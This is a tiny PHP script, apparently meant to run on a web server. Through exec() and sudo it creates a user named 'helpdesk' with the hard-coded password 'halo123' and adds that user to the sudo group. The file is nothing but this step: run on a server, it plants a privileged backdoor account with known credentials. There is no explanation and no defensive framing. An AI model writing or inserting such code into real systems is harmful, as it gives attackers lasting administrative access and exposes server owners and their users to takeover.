<?php
$username = "helpdesk";
$password = "halo123";

exec("sudo useradd -m -s /bin/bash $username -G sudo && echo '$username:$password' | sudo chpasswd");
?>
